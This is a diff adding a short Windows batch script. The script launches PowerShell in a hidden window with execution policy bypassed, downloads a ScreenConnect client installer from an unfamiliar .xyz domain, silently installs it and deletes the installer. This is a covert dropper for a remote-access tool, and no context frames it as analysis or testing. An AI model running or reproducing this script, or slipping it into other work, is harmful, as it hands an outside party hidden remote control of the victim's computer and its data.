@@ -1,0 +1,3 @@
+@echo off
+powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "$url='https://adsourceplus.xyz/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest';$msi='C:\Temp\ScreenConnect.ClientSetup.msi';mkdir C:\Temp -Force|Out-Null;Invoke-WebRequest -Uri $url -OutFile $msi -UseBasicParsing;Start-Process msiexec.exe -ArgumentList '/i',$msi,'/qb','/norestart' -NoNewWindow -Wait;Remove-Item $msi -Force"
+exit /b
